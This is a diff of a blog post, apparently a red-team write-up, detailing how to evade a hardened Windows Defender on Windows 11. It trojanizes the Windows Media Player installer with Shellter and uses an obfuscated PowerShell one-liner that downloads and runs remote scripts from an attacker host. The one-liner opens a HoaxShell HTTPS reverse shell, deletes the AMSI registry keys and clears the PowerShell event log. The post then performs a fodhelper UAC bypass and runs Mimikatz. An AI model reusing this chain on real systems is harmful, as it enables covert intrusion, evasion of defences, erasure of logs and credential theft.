@@ -5,11 +5,10 @@ description: "Chaining Shellter Pro's AV/EDR evasion with HoaxShell's HTTP-based
 date: 2025-06-23
 permalink: /defender-evasion-shellter-hoaxshell
 image: /assets/og/defender-evasion-shellter-hoaxshell.png
-lang: en
 tags: [evasion, defender, shellter, hoaxshell, AMSI, UAC, bypass]
 ---
 
-# Table of Contents
+## Table of Contents
 - [Introduction](#introduction)
 - [Windows Defender Overview](#windows-defender-overview)
 - [Disclaimer](#disclaimer)
@@ -24,7 +23,7 @@ tags: [evasion, defender, shellter, hoaxshell, AMSI, UAC, bypass]
 - [Post-exploitation](#post-exploitation)
   - [Privilege escalation](#privilege-escalation)
 
-# Introduction
+## Introduction
 In this write-up, I document a successful attempt to bypass a fully hardened Windows Defender installation on an up-to-date Windows 11 machine, utilizing a combination of **Shellter** and **HoaxShell**. The payload, a multi-stage HTTPS reverse shell, was stealthily injected into a legitimate Microsoft executable, successfully evading real-time detection.
 
 The attack chain relied exclusively on **userland techniques** and **LOLBins (Living Off The Land Binaries)**, ensuring no additional tools were written to disk. After achieving initial access, I focused on bypassing **AMSI** and **User Account Control (UAC)** to escalate privileges and execute arbitrary code in a high-integrity context.
@@ -39,10 +38,10 @@ This post details each stage of the operation, including:
 
 Despite the effectiveness of this attack, it is important to note that no zero-day vulnerabilities were exploited. This is not the result of a novel exploit or obscure offensive research. On the contrary, the techniques demonstrated here rely entirely on freely available, open-source tools such as **Shellter** and **HoaxShell**, combined with simple registry modifications and **LOLBin** abuse. Every element in the attack chain is already known, documented, and theoretically detectable. The true impact of this approach lies not in the use of novel exploits but in the artful orchestration of timing, tool selection, and disciplined execution to achieve stealthy evasion. In essence, effective red team operations may not require futuristic techniques, just the right blend of established methods applied with precision.
 
-# Windows Defender Overview
+## Windows Defender Overview
 Over the past decade, Windows Defender has evolved from a basic antivirus tool into a comprehensive, cloud-integrated antimalware and endpoint protection platform. Once considered insufficient for serious threat defense, Windows Defender now consistently ranks among the top performers in independent evaluations by AV-TEST and AV-Comparatives ([av-test.org](https://www.av-test.org/en/antivirus/home-windows/manufacturer/microsoft/)). The consumer version, integrated into Windows 10 and 11, leverages real-time protection, behavioral analysis, and cloud-delivered intelligence to detect and block threats with impressive speed and accuracy. According to [Microsoft's documentation](https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-updates), Defender receives monthly platform updates and daily security intelligence updates, incorporating AI-enhanced detection logic and telemetry from billions of devices. Features such as tamper protection, ransomware rollback, and integration with Microsoft's broader security ecosystem (including Defender SmartScreen and Microsoft Defender for Endpoint) have made it a serious contender in enterprise environments. In summary, what was once a barebones antivirus has become a robust, modern antimalware solution, included with every Windows machine.
 
-# Disclaimer
+## Disclaimer
 The techniques and methodologies described in this document are provided solely for educational, research, and defensive purposes. All demonstrations were conducted in isolated and controlled laboratory environments, with explicit authorization and under stringent security measures.
 
 **Important Notice**:
@@ -53,12 +52,12 @@ The techniques and methodologies described in this document are provided solely 
 
 By continuing to use the information presented here, you acknowledge that you have read, understood, and agree to abide by these terms.
 
-# Requirements
+## Requirements
 - Windows 11; in this test, a Windows 11 Education (build 10.0.26100.4351) was used, the latest build available when this document was written.
 - Windows Defender fully hardened and fully updated; for simplicity, [ConfigureDefender](https://github.com/AndyFul/ConfigureDefender) was used in this test to speed up Windows Defender hardening.
 - Kali Linux (optional, of course).
 
-## Tools used
+### Tools used
 - [ConfigureDefender](https://github.com/AndyFul/ConfigureDefender)
 - [Shellter](https://www.shellterproject.com) free version, available in Kali repositories: [https://www.kali.org/tools/shellter/](https://www.kali.org/tools/shellter/)
 - [HoaxShell](https://github.com/t3l3machus/hoaxshell)
@@ -66,33 +65,33 @@ By continuing to use the information presented here, you acknowledge that you ha
 - [lainamsiopensession](https://github.com/raskolnikov90/LainAmsiOpenSession/blob/main/lainamsiopensession.ps1)
 - [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 
-## Windows Defender hardening
+### Windows Defender hardening
 As mentioned earlier, the [ConfigureDefender](https://github.com/AndyFul/ConfigureDefender) tool was used to speed up and simplify the enabling of almost all Windows Defender features, thus enabling the "MAX" profile:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender1.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender2.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender3.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender4.png){:loading="lazy" decoding="async"}
+![ConfigureDefender 4.0.1.1 window with the MAX protection profile and basic Defender settings all set to ON](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender1.png){:loading="lazy" decoding="async"}
+![ConfigureDefender showing SmartScreen and Exploit Guard ASR rules for productivity apps and scripts all set to ON](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender2.png){:loading="lazy" decoding="async"}
+![ConfigureDefender with email and other ASR rules enabled; the 'Block executable files unless prevalent/aged/trusted' rule set to Audit](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender3.png){:loading="lazy" decoding="async"}
+![ConfigureDefender bottom section with Network Protection and Controlled Folder Access enabled](/assets/img/defender-evasion-shellter-hoaxshell/ConfigureDefender4.png){:loading="lazy" decoding="async"}
 
 The `Block executable files from running unless they meet a prevalence, age, or trusted list criteria` is the only setting modified, in this test, in the "MAX" profile. Otherwise, Windows Defender will prevent me from running any new binaries, regardless of whether they may be malicious or not. This setting is too paranoid.
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/WindowsDefender1.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/WindowsDefender2.png){:loading="lazy" decoding="async"}
+![Windows Security 'Security at a glance' dashboard with all protection cards reporting healthy status](/assets/img/defender-evasion-shellter-hoaxshell/WindowsDefender1.png){:loading="lazy" decoding="async"}
+![Windows Security Protection updates screen showing security intelligence version 1.431.158.0, up to date](/assets/img/defender-evasion-shellter-hoaxshell/WindowsDefender2.png){:loading="lazy" decoding="async"}
 
-# Exploitation
-## HTTPS multi-stage reverse shell with HoaxShell
+## Exploitation
+### HTTPS multi-stage reverse shell with HoaxShell
 First, I created self-signed certificates for HoaxShell to use for its HTTPS reverse shell:
 ```sh
 openssl req -x509 -newkey rsa:2048 -keyout /home/MrTiz/DefenderBypass/certs/key.pem -out /home/MrTiz/DefenderBypass/certs/cert.pem -days 365
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/self-signed_certs.png){:loading="lazy" decoding="async"}
+![OpenSSL req -x509 command generating a self-signed certificate using Microsoft Corporation as the organization and 192.168.182.128 as the common name](/assets/img/defender-evasion-shellter-hoaxshell/self-signed_certs.png){:loading="lazy" decoding="async"}
 In generating the certificate, the same parameters were used as in the certificate issued for [microsoft.com](https://www.microsoft.com), but it is optional; I only did it because it may increase the stealthiness of the attack.
 
 After that, I started HoaxShell listening on port 443:
 ```sh
 hoaxshell -s 192.168.182.128 -c /home/MrTiz/DefenderBypass/certs/cert.pem -k /home/MrTiz/DefenderBypass/certs/key.pem -H 'ms-commit-id' -r
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell1.png){:loading="lazy" decoding="async"}
+![HoaxShell banner and generated PowerShell HTTPS reverse-shell payload copied to clipboard, with the server listening on port 443](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell1.png){:loading="lazy" decoding="async"}
 
 Again, the choice to use `ms-commit-id` as a header in HTTPS traffic is only to slightly increase the stealthiness of the attack, but again, this is an optional parameter. In any case, I find in the HoaxShell documentation that avoiding using the random headers used by default by HoaxShell can make life a little more difficult for AVs:
 
@@ -107,18 +106,18 @@ The use of a raw PowerShell payload also demonstrated much greater stealthiness 
 
 I saved the PowerShell payload in a `.ps1` file and put a simple Python web server listening, ready to deliver the script in a second stage. This way, I avoided embedding a HoaxShell payload inside my executable that I'm going to trojanize. By doing this, I should be able to pass the static analysis of most anti-malware.
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/python_webserver1.png){:loading="lazy" decoding="async"}
+![Kali terminal showing the HoaxShell revs.ps1 payload contents and a Python HTTP server started on port 80 to deliver it](/assets/img/defender-evasion-shellter-hoaxshell/python_webserver1.png){:loading="lazy" decoding="async"}
 
-## Trojanizing a legitimate Microsoft executable
+### Trojanizing a legitimate Microsoft executable
 As an executable to be trojanized, something trusted, legitimate, having a recognized author (preferably Microsoft), and having a 32-bit architecture had to be chosen; the current free version of Shellter does not seem to support 64-bit executables.
 After testing a few, it was decided to use the **Windows Media Player** installer, generally available on Windows 11 machines at the path `C:\Program Files (x86)\Windows Media Player\setup_wm.exe`.
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/orig-setup_wm.png){:loading="lazy" decoding="async"}
+![PowerShell Get-FileHash output for the original Windows Media Player setup_wm.exe (SHA256 BD56CDF7...)](/assets/img/defender-evasion-shellter-hoaxshell/orig-setup_wm.png){:loading="lazy" decoding="async"}
 
 Once copied to the Kali machine, I started and configured Shellter:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/shellter1.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/shellter2.png){:loading="lazy" decoding="async"}
+![Shellter v7.2 startup on Kali showing setup_wm.exe loaded as the PE target and PE compatibility information](/assets/img/defender-evasion-shellter-hoaxshell/shellter1.png){:loading="lazy" decoding="async"}
+![Shellter payload selection with Stealth Mode disabled and the WinExec payload (#7) set to launch the custom multi-stage PowerShell command](/assets/img/defender-evasion-shellter-hoaxshell/shellter2.png){:loading="lazy" decoding="async"}
 
 Paradoxically, enabling **Stealth Mode** makes the trojan much more detectable by static analysis on VirusTotal, which is why I chosed to disable it, thus going to change the general behavior of the executable, which will then stop doing what it was intended to do.
 
@@ -155,11 +154,11 @@ Waiting 30 seconds will be useful in the next phases, when I'll escalate the pri
 
 Putting PowerShell commands such as the above (`Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers*\*' -Force`) can trigger some AV also during static analysis, so, by using [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), I slightly obfuscated the payload in this way:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Obfuscation2.png){:loading="lazy" decoding="async"}
+![Invoke-Obfuscation applying the Token/String/1 Concatenate transform to the AMSI Providers registry-clearing scriptblock](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Obfuscation2.png){:loading="lazy" decoding="async"}
 ```powershell
 Remove-Item -Path (('HKLM:DGvS'+'OFTWARE'+'D'+'GvMic'+'rosoftDGv'+'A'+'MS'+'IDG'+'vProviders*DGv'+'*') -CreplaCE  'DGv',[chAR]92) -Force -ea SilentlyContinue; Clear-EventLog -LogName ('Wind'+'ows Pow'+'erS'+'hell') -ea SilentlyContinue
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Obfuscation1.png){:loading="lazy" decoding="async"}
+![Invoke-Obfuscation applying the Token/String/1 Concatenate transform to the full multi-stage PowerShell payload](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Obfuscation1.png){:loading="lazy" decoding="async"}
 ```powershell
 iex(New-Object Net.WebClient).DownloadString(('http://192.168.1'+'8'+'2.1'+'2'+'8'+'/4m51.'+'p'+'s'+'1')); Remove-Item -Path (('HKL'+'M:{0}'+'SOF'+'TWARE{0}M'+'icro'+'sof'+'t{0}'+'A'+'MSI{'+'0}Pr'+'o'+'viders*{'+'0}*') -f [cHAR]92) -Force -ea SilentlyContinue; Start-Sleep -Seconds 30; iex(New-Object Net.WebClient).DownloadString(('http://'+'192.168.1'+'82.'+'12'+'8/revs'+'.ps1')); Clear-EventLog -LogName ('Windo'+'ws Po'+'w'+'er'+'Shell') -ea SilentlyContinue
 ```
@@ -167,7 +166,7 @@ So, the final payload was:
 ```powershell
 cmd /c start /wait /min "" C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -nop -w hidden -noni -c "Remove-Item -Path (('HKLM:DGvS'+'OFTWARE'+'D'+'GvMic'+'rosoftDGv'+'A'+'MS'+'IDG'+'vProviders*DGv'+'*') -CreplaCE  'DGv',[chAR]92) -Force -ea SilentlyContinue; Clear-EventLog -LogName ('Wind'+'ows Pow'+'erS'+'hell') -ea SilentlyContinue" & cmd /c start /min "" C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -nop -w hidden -noni -c "iex(New-Object Net.WebClient).DownloadString(('http://192.168.1'+'8'+'2.1'+'2'+'8'+'/4m51.'+'p'+'s'+'1')); Remove-Item -Path (('HKL'+'M:{0}'+'SOF'+'TWARE{0}M'+'icro'+'sof'+'t{0}'+'A'+'MSI{'+'0}Pr'+'o'+'viders*{'+'0}*') -f [cHAR]92) -Force -ea SilentlyContinue; Start-Sleep -Seconds 30; iex(New-Object Net.WebClient).DownloadString(('http://'+'192.168.1'+'82.'+'12'+'8/revs'+'.ps1')); Clear-EventLog -LogName ('Windo'+'ws Po'+'w'+'er'+'Shell') -ea SilentlyContinue"
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/shellter3.png){:loading="lazy" decoding="async"}
+![Shellter finishing PE checksum fix and injection verification; sha256sum of the trojanized setup_wm.exe returns e5d427a8...](/assets/img/defender-evasion-shellter-hoaxshell/shellter3.png){:loading="lazy" decoding="async"}
 The trojanized `setup_wm.exe` has been created:
 ```sh
 sha256sum /home/MrTiz/DefenderBypass/setup_wm.exe
@@ -177,17 +176,17 @@ e5d427a8d9132f8ff121a20fb6e5168c3e74826ca3dd3a62fc1306693260f74a  /home/MrTiz/De
 
 On VirusTotal, we found only 3/70 detections, and Windows Defender didn't detect anything: [https://www.virustotal.com/gui/file/e5d427a8d9132f8ff121a20fb6e5168c3e74826ca3dd3a62fc1306693260f74a](https://www.virustotal.com/gui/file/e5d427a8d9132f8ff121a20fb6e5168c3e74826ca3dd3a62fc1306693260f74a)
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/virustotal.png){:loading="lazy" decoding="async"}
+![VirusTotal report for the trojanized setup_wm.exe: only 3 of 70 vendors flag it as malicious (Bkav Pro, Fortinet, Rising)](/assets/img/defender-evasion-shellter-hoaxshell/virustotal.png){:loading="lazy" decoding="async"}
 
-## Trojan execution
+### Trojan execution
 Once the trojan is uploaded to the victim's machine, simply run it:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/troj-setup_wm.png){:loading="lazy" decoding="async"}
+![PowerShell Get-FileHash on the Windows victim confirming the trojanized setup_wm.exe (SHA256 E5D427A8...)](/assets/img/defender-evasion-shellter-hoaxshell/troj-setup_wm.png){:loading="lazy" decoding="async"}
 
 The `4m51.ps1` will be automatically downloaded by the victim's machine and executed to bypass AMSI protection; after about 30 seconds, `revs.ps1` will also be downloaded and executed, and the HTTPS reverse shell will be triggered:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/python_webserver2.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell2.png){:loading="lazy" decoding="async"}
+![Python HTTP server logs showing the victim (192.168.182.129) requesting /4m51.ps1 and /revs.ps1, both returning HTTP 200](/assets/img/defender-evasion-shellter-hoaxshell/python_webserver2.png){:loading="lazy" decoding="async"}
+![HoaxShell reverse shell established: initial PowerShell recon (date, whoami, hostname, whoami /priv, Get-HotFix) with no Defender detections](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell2.png){:loading="lazy" decoding="async"}
 
 As you can see in the above screenshot, the following command does not return any results, meaning that no detections from Windows Defender have been triggered:
 ```powershell
@@ -196,20 +195,20 @@ Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -ge (Get-Date "6/
 
 I can see the current Windows 11 build (`10.0.26100.4351`) and some information related to the current PowerShell process, which shows that my process is not running in a High integrity level:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/hostinfo.png){:loading="lazy" decoding="async"}
+![PowerShell recon showing Windows 11 Education build 10.0.26100.4351 and the current powershell.exe running non-elevated as MrTiz](/assets/img/defender-evasion-shellter-hoaxshell/hostinfo.png){:loading="lazy" decoding="async"}
 
 Moreover, I can also see Windows Defender status:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/defenderstatus1.png){:loading="lazy" decoding="async"}
+![Get-MpComputerStatus output confirming Windows Defender is fully enabled and Tamper Protection is active on the victim](/assets/img/defender-evasion-shellter-hoaxshell/defenderstatus1.png){:loading="lazy" decoding="async"}
 
-## Testing the effectiveness of AMSI bypass
+### Testing the effectiveness of AMSI bypass
 It is time to test the effectiveness of the performed AMSI bypass.
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
 
 Invoke-Seatbelt
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-SeatBelt.png){:loading="lazy" decoding="async"}
+![Invoke-Seatbelt blocked by .NET AMSI; Get-MpThreatDetection then reveals that Windows Defender detected the AMSI patch attempt in powershell.exe](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-SeatBelt.png){:loading="lazy" decoding="async"}
 As you can see, I have no problem importing the `Invoke-SeatBelt.ps1` module, a symptom that the AMSI PowerShell bypass works; however, as soon as I execute `Invoke-SeatBelt`, I'm blocked by .NET's AMSI, also triggering Windows Defender.
 ```powershell
 Exception calling "Load" with "1" argument(s): "Could not load file or assembly '608256 bytes loaded from Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format." Unable to find type [AnschnallGurt.Program].
@@ -231,27 +230,27 @@ $ps.Runspace = $runspace
 $ps.AddScript("iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') > C:\Users\MrTiz\Downloads\peas.txt")
 $asyncResult = $ps.BeginInvoke()
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS1.png){:loading="lazy" decoding="async"}
+![PowerShell Runspaces launching winPEAS in the background and redirecting output to C:/Users/MrTiz/Downloads/peas.txt](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS1.png){:loading="lazy" decoding="async"}
 
 The output of the command was redirected to `C:\Users\MrTiz\Downloads\peas.txt`:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS2.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS3.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS4.png){:loading="lazy" decoding="async"}
+![winPEAS output (peas.txt) showing host and system info: Windows 11 Education on VMware, AMD Ryzen CPU, installed hotfixes](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS2.png){:loading="lazy" decoding="async"}
+![winPEAS output continued: virtualization-based security status, Windows update history, drive C: capacity](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS3.png){:loading="lazy" decoding="async"}
+![winPEAS output continued: recent Windows update results, drive C: details, local password and lockout policy](/assets/img/defender-evasion-shellter-hoaxshell/winPEAS4.png){:loading="lazy" decoding="async"}
 
-# Post-exploitation
-## Privilege escalation
+## Post-exploitation
+### Privilege escalation
 The user is currently part of the `Administrators` group; however, since I'm running in a *Medium integrity level*, I cannot perform any admin action on the victim machine:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/user_privs1.png){:loading="lazy" decoding="async"}
+![PowerShell showing MrTiz is a member of the local Administrators group but currently running at Medium integrity with only limited privileges](/assets/img/defender-evasion-shellter-hoaxshell/user_privs1.png){:loading="lazy" decoding="async"}
 
 Moreover, the UAC is enabled:
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/uac1.png){:loading="lazy" decoding="async"}
+![Windows User Account Control Settings dialog with the notification slider at the default level](/assets/img/defender-evasion-shellter-hoaxshell/uac1.png){:loading="lazy" decoding="async"}
 ```powershell
 (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/uac2.png){:loading="lazy" decoding="async"}
+![PowerShell Get-ItemProperty confirming EnableLUA = 1, i.e. UAC is enabled on the victim](/assets/img/defender-evasion-shellter-hoaxshell/uac2.png){:loading="lazy" decoding="async"}
 
 So, since the user is in the `Administrators` group, I can try to bypass UAC. There are various methods to do this, some of them, based on the exploitation of `Fodhelper.exe`, are very simple to implement, such as the following:
 - [https://github.com/P4R4D0X-HACKS/UAC-Bypass/blob/main/script.ps1](https://github.com/P4R4D0X-HACKS/UAC-Bypass/blob/main/script.ps1)
@@ -286,16 +285,16 @@ PSChildName  : command
 PSDrive      : HKCU
 PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
-![](/assets/img/defender-evasion-shellter-hoaxshell/uacbypass.png){:loading="lazy" decoding="async"}
+![PowerShell performing the fodhelper.exe UAC bypass: registry keys are added via conhost.exe and fodhelper.exe is launched with no Defender detection](/assets/img/defender-evasion-shellter-hoaxshell/uacbypass.png){:loading="lazy" decoding="async"}
 
 As you can see, no detection was raised by Windows Defender, neither after modifying the registry keys nor after running `fodhelper.exe`.
 At this point, since `setup_wm.exe` has been executed again, I terminate the current running session and relaunch `HoaxShell`, waiting until, after the 30-second sleep time entered in the payload has expired, a new reverse shell is launched, this time with administrative privileges. Yes, this is precisely the point at which the `Start-Sleep` shown earlier becomes useful, to give me time to launch a new listener. Also, since this time `setup_wm.exe` will be run with administrative privileges, the first piece of the payload will run, going on to clear the AMSI registry keys, thus disabling it globally. It is important to delete these registry keys before starting a new PowerShell process; otherwise, that process will still be launched with AMSI protection active.
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell3.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell4.png){:loading="lazy" decoding="async"}
+![HoaxShell session restored at high integrity after the UAC bypass; whoami /priv now shows admin privileges including SeDebugPrivilege and SeImpersonatePrivilege](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell3.png){:loading="lazy" decoding="async"}
+![Continued whoami /priv listing all high-integrity privileges, followed by re-downloading Invoke-Seatbelt.ps1 through the high-integrity session](/assets/img/defender-evasion-shellter-hoaxshell/hoaxshell4.png){:loading="lazy" decoding="async"}
 
 Now our PowerShell process is running with *High integrity level*. Again, no detection was raised by Windows Defender.
 To conclude, let me verify that the global disabling of AMSI actually works by retrying to run `SeatBelt` and perhaps `Mimikatz` as well.
 
-![](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-SeatBelt2.png){:loading="lazy" decoding="async"}
-![](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Mimikatz.png){:loading="lazy" decoding="async"}
+![Invoke-Seatbelt (AnschnallGurt v1.2.2) executing successfully after the global AMSI bypass, proving the disable persists across processes](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-SeatBelt2.png){:loading="lazy" decoding="async"}
+![Mimikatz 2.2.0 executed in-memory via Invoke-Mimikatz: token::elevate impersonates NT AUTHORITY/SYSTEM and privilege::debug succeeds](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Mimikatz.png){:loading="lazy" decoding="async"}
